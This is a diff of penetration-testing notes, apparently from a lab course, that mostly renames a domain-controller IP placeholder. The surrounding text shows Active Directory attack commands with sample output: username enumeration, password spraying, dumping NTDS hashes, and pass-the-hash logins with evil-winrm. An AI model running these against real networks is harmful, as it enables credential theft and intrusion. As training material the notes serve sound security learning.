@@ -2353,7 +2353,7 @@ sudo mv kerbrute /usr/local/bin/
 **Usage**
 
 ```bash
-kerbrute userenum --dc <DC IP> -d exampledomain.local ~/usernames.txt
+kerbrute userenum --dc <DC_IP> -d exampledomain.local ~/usernames.txt
 ```
 
 Example output
@@ -2361,7 +2361,7 @@ Example output
 ```bash
 # ...
 # 2025/04/25 09:17:10 >  Using KDC(s):
-# 2025/04/25 09:17:10 >   <DC IP>:<PORT>
+# 2025/04/25 09:17:10 >   <DC_IP>:<PORT>
 
 # 2025/04/25 09:17:11 >  [+] VALID USERNAME:       bwilliamson@exampledomain.local
 # ...
@@ -2379,13 +2379,13 @@ Once we've identified the naming convention and gathered employee names or prepa
 Wordlist
 
 ```bash
-crackmapexec smb <DC IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt | grep "+"
+crackmapexec smb <DC_IP> -u ~/usernames.txt -p /usr/share/wordlists/fasttrack.txt | grep "+"
 ```
 
 Username
 
 ```bash
-crackmapexec smb <DC IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+"
+crackmapexec smb <DC_IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+"
 ```
 
 **Option 2: netexec**
@@ -2393,21 +2393,21 @@ crackmapexec smb <DC IP> -u john -p /usr/share/wordlists/fasttrack.txt | grep "+
 **Usage**
 
 ```bash
-netexec smb <DC IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
+netexec smb <DC_IP> -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 ```
 
 Example output
 
 ```bash
-# SMB         <DC IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
-# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
-# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
-# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
-# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
-# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
-# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
-# SMB         <DC IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
-# SMB         <DC IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd! 
+# SMB         <DC_IP>     445    DC01           [*] Windows 10.0 Build 17763 x64 (name:DC-PAC) (domain:dac.local) (signing:True) (SMBv1:False)
+# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2017 STATUS_LOGON_FAILURE 
+# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2016 STATUS_LOGON_FAILURE 
+# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2015 STATUS_LOGON_FAILURE 
+# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2014 STATUS_LOGON_FAILURE 
+# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:winter2013 STATUS_LOGON_FAILURE 
+# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@55w0rd STATUS_LOGON_FAILURE 
+# SMB         <DC_IP>     445    DC01             [-] exampledomain.local\bwilliamson:P@ssw0rd! STATUS_LOGON_FAILURE 
+# SMB         <DC_IP>     445    DC01             [+] exampledomain.local\bwilliamson:P@55w0rd! 
 ```
 
 In this example, NetExec uses SMB to attempt a login as user bwilliamson (-u) with a password list (-p) of common passwords located at `/usr/share/wordlists/fasttrack.txt`. Be aware that if an account lockout policy is in place, this attack could lock the targeted account.
@@ -2434,29 +2434,29 @@ We have two options to obtain this file:
 Using crackmapexec to capture NTDS.dit
 
 ```bash
-crackmapexec smb <DC IP> -u <USER> -p '<PASSWORD>' --ntds drsuapi
+crackmapexec smb <DC_IP> -u <USER> -p '<PASSWORD>' --ntds drsuapi
 ```
 
 Example output
 
 ```bash
 # [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
-# SMB         <DC IP>   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
-# SMB         <DC IP>   445    ILF-DC01         [+] ILF.local\<USER>:<PASSWORD> (Pwn3d!)
-# SMB         <DC IP>   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
-# SMB         <DC IP>   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
-# SMB         <DC IP>   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-# SMB         <DC IP>   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
-# SMB         <DC IP>   445    ILF-DC01         ILF.local\<USER>:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
-# SMB         <DC IP>   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
-# SMB         <DC IP>   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
-# SMB         <DC IP>   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
-# SMB         <DC IP>   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ad36b2c78047b7d2b6c64a17225ed0c8:::
-# SMB         <DC IP>   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
-# SMB         <DC IP>   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds of which 7 were added to the database
-# SMB         <DC IP>   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command:
-# SMB         <DC IP>   445    ILF-DC01         [*] cat /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds | grep -iv disabled | cut -d ':' -f1
-# SMB         <DC IP>   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC IP>_2025-07-10_115224.ntds | cut -d ':' -f1
+# SMB         <DC_IP>   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:False)
+# SMB         <DC_IP>   445    ILF-DC01         [+] ILF.local\<USER>:<PASSWORD> (Pwn3d!)
+# SMB         <DC_IP>   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
+# SMB         <DC_IP>   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+# SMB         <DC_IP>   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# SMB         <DC_IP>   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
+# SMB         <DC_IP>   445    ILF-DC01         ILF.local\<USER>:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
+# SMB         <DC_IP>   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
+# SMB         <DC_IP>   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
+# SMB         <DC_IP>   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
+# SMB         <DC_IP>   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:ad36b2c78047b7d2b6c64a17225ed0c8:::
+# SMB         <DC_IP>   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
+# SMB         <DC_IP>   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC_IP>_2025-07-10_115224.ntds of which 7 were added to the database
+# SMB         <DC_IP>   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command:
+# SMB         <DC_IP>   445    ILF-DC01         [*] cat /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC_IP>_2025-07-10_115224.ntds | grep -iv disabled | cut -d ':' -f1
+# SMB         <DC_IP>   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-1640397/.nxc/logs/ILF-DC01_<DC_IP>_2025-07-10_115224.ntds | cut -d ':' -f1
 ```
 
 Then, we can save the hashes in a file. For example, `hashes_ntlm.txt`.
@@ -2476,7 +2476,7 @@ cat <FILE.NTDS> | cut -d ':' -f4 | sort -u > hashes_ntlm.txt
 We can connect to a target DC using the credentials we captured.
 
 ```bash
-evil-winrm -i <DC IP>  -u <USERNAME> -p <PASSWORD>
+evil-winrm -i <DC_IP>  -u <USERNAME> -p <PASSWORD>
 ```
 
 > Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
@@ -2593,7 +2593,7 @@ But what happens if we're unable to crack a hash?
 We can attempt to use this attack when needing to move laterally across a network after the initial compromise of a target.
 
 ```bash
-evil-winrm -i <DC IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
+evil-winrm -i <DC_IP> -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 ```
 
 </details>
@@ -3729,7 +3729,7 @@ Import-Module .\PowerHuntShares.psm1
 Execute the tool:
 
 ```powershell
-Invoke-HuntSMBShares -Threads 100 -RunSpaceTimeOut 10 -OutputDirectory c:\Users\Public -DomainController <DC IP> -Credential <DOMAIN>\<USER>
+Invoke-HuntSMBShares -Threads 100 -RunSpaceTimeOut 10 -OutputDirectory c:\Users\Public -DomainController <DC_IP> -Credential <DOMAIN>\<USER>
 ```
 
 </details>
@@ -6040,6 +6040,8 @@ Now that we've seen how to perform various lateral movement techniques from Wind
 
 </details>
 
+---
+
 <details>
 <summary><h1>🔐 Password Management</h1></summary>
 
@@ -6129,6 +6131,8 @@ This tools evaluate the strength of passwords:
 
 * [PasswordMonster](https://www.passwordmonster.com/)
 
+
+</details>
 
 </details>
 
